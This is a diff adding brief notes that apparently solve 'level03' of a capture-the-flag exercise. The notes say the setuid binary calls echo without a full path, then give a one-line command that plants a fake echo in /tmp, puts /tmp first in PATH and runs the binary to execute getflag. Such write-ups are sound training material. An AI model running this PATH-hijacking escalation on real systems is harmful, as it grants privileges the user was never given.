@@ -1,0 +1,5 @@
+binary uses echo -> strings level03
+and have the perm level for getflag
+
+use a fake echo for getflag instead
+-> echo '/bin/getflag' > /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp:$PATH; ./level03
